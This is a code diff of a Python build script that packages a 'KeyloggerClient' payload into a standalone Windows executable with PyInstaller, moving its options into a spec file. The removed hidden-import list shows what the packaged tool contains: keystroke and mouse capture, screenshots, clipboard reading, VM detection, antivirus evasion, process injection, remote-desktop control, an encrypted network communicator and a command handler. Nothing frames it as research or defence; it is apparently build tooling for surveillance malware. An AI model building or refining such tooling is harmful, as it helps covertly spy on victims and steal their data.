@@ -24,7 +24,7 @@ else:
 
 class Builder:
     def __init__(self):
-        self.source_file = "main.py"
+        self.spec_file = "KeyloggerClient.spec"
         self.output_dir = "dist"
         self.payload_exe = os.path.join(self.output_dir, "KeyloggerClient.exe")
         self.b64_output = os.path.join(self.output_dir, "KeyloggerClient_b64.txt")
@@ -39,28 +39,8 @@ class Builder:
                 print(f"Installing dependencies from {requirements_file}...")
                 logging.info(f"Installing dependencies from {requirements_file}...")
                 
-                # Upgrade pip first
-                subprocess.run([sys.executable, "-m", "pip", "install", "--upgrade", "pip"], check=True)
-                
                 # Install all requirements
                 subprocess.run([sys.executable, "-m", "pip", "install", "-r", requirements_file], check=True)
-                
-                # Install additional dependencies that might be missing
-                additional_deps = [
-                    "cryptography",
-                    "pynput",
-                    "win32api",
-                    "win32con",
-                    "win32process",
-                    "win32security",
-                    "pywin32"
-                ]
-                
-                for dep in additional_deps:
-                    try:
-                        subprocess.run([sys.executable, "-m", "pip", "install", dep], check=False)
-                    except:
-                        pass
                 
                 print("Dependencies installed successfully")
                 logging.info("Dependencies installed successfully")
@@ -73,107 +53,27 @@ class Builder:
             raise Exception(f"Failed to install dependencies: {str(e)}")
 
     def build_payload(self):
-        """Build the source code into an executable without obfuscation."""
+        """Build the source code into an executable using spec file."""
         try:
-            print("Building payload with PyInstaller...")
-            logging.info("Building payload with PyInstaller...")
-
-            # Check if source file exists
-            if not os.path.exists(self.source_file):
-                raise Exception(f"Source file not found: {self.source_file}")
-
+            print("Building payload with PyInstaller using spec file...")
+            logging.info("Building payload with PyInstaller using spec file...")
+    
+            # Check if spec file exists
+            if not os.path.exists(self.spec_file):
+                raise Exception(f"Spec file not found: {self.spec_file}")
+    
             # Create output directory if it doesn't exist
             os.makedirs(self.output_dir, exist_ok=True)
-
-            # Comprehensive PyInstaller command with all dependencies
+    
+            # Build using spec file
             pyinstaller_cmd = [
                 "pyinstaller",
                 "--noconfirm",
-                "--onefile",
-                "--windowed" if self.is_ci else "--noconsole",  # Use --windowed in CI
                 "--clean",
-                
-                # Hidden imports for keyboard/input monitoring
-                "--hidden-import", "keyboard",
-                "--hidden-import", "pynput",
-                "--hidden-import", "pynput.keyboard",
-                "--hidden-import", "pynput.mouse",
-                
-                # Hidden imports for GUI/screenshots
-                "--hidden-import", "pyautogui",
-                "--hidden-import", "PIL",
-                "--hidden-import", "PIL.Image",
-                "--hidden-import", "PIL.ImageGrab",
-                
-                # Hidden imports for system operations
-                "--hidden-import", "psutil",
-                "--hidden-import", "pyperclip",
-                
-                # Hidden imports for Windows API
-                "--hidden-import", "win32api",
-                "--hidden-import", "win32con",
-                "--hidden-import", "win32process",
-                "--hidden-import", "win32security",
-                "--hidden-import", "win32file",
-                "--hidden-import", "win32service",
-                "--hidden-import", "win32serviceutil",
-                "--hidden-import", "pywintypes",
-                
-                # Hidden imports for networking
-                "--hidden-import", "requests",
-                "--hidden-import", "urllib3",
-                "--hidden-import", "certifi",
-                
-                # Hidden imports for encryption
-                "--hidden-import", "cryptography",
-                "--hidden-import", "cryptography.hazmat",
-                "--hidden-import", "cryptography.hazmat.primitives",
-                "--hidden-import", "cryptography.hazmat.primitives.ciphers",
-                "--hidden-import", "cryptography.hazmat.backends",
-                "--hidden-import", "cryptography.hazmat.backends.openssl",
-                
-                # Hidden imports for configuration
-                "--hidden-import", "dotenv",
-                "--hidden-import", "packaging",
-                "--hidden-import", "packaging.version",
-                
-                # Hidden imports for custom modules
-                "--hidden-import", "system.file_manager",
-                "--hidden-import", "system.collector",
-                "--hidden-import", "system.vm_detector",
-                "--hidden-import", "system.anti_av",
-                "--hidden-import", "system.process_injector",
-                "--hidden-import", "monitoring.logger",
-                "--hidden-import", "monitoring.rdp_controller",
-                "--hidden-import", "network.communicator",
-                "--hidden-import", "encryption.manager",
-                "--hidden-import", "commands.handler",
-                
-                # Collect all submodules
-                "--collect-submodules", "cryptography",
-                "--collect-submodules", "PIL",
-                "--collect-submodules", "pynput",
-                
-                # Copy metadata
-                "--copy-metadata", "cryptography",
-                "--copy-metadata", "requests",
-                
-                # Output directories
-                "--distpath", self.output_dir,
-                "--specpath", "build",
-                "--workpath", "build",
-                
-                # Add icon if exists
+                self.spec_file
             ]
             
-            # Add icon if available
-            if os.path.exists("icon.ico"):
-                pyinstaller_cmd.extend(["--icon", "icon.ico"])
-            
-            # Add the source file
-            pyinstaller_cmd.append(self.source_file)
-            
-            print(f"Executing PyInstaller with {len(pyinstaller_cmd)} arguments...")
+            print(f"Executing PyInstaller with spec file: {self.spec_file}")
             logging.debug(f"PyInstaller command: {' '.join(pyinstaller_cmd)}")
             
             # Run PyInstaller
@@ -184,22 +84,17 @@ class Builder:
             if result.stderr:
                 print("PyInstaller stderr:", result.stderr[:500])
 
-            # Rename the output executable
-            original_exe = os.path.join(self.output_dir, "main.exe")
-            if os.path.exists(original_exe):
-                if os.path.exists(self.payload_exe):
-                    os.remove(self.payload_exe)
-                shutil.move(original_exe, self.payload_exe)
-                
-                # Get file size
-                file_size = os.path.getsize(self.payload_exe)
-                file_size_mb = file_size / (1024 * 1024)
-                
-                print(f"Payload built successfully: {self.payload_exe}")
-                print(f"File size: {file_size_mb:.2f} MB")
-                logging.info(f"Payload built successfully: {self.payload_exe} ({file_size_mb:.2f} MB)")
-            else:
-                raise Exception("PyInstaller output not found")
+            # Check if executable was created
+            if not os.path.exists(self.payload_exe):
+                raise Exception(f"Payload executable not found: {self.payload_exe}")
+            
+            # Get file size
+            file_size = os.path.getsize(self.payload_exe)
+            file_size_mb = file_size / (1024 * 1024)
+            
+            print(f"Payload built successfully: {self.payload_exe}")
+            print(f"File size: {file_size_mb:.2f} MB")
+            logging.info(f"Payload built successfully: {self.payload_exe} ({file_size_mb:.2f} MB)")
 
         except subprocess.CalledProcessError as e:
             print(f"PyInstaller failed with exit code {e.returncode}")
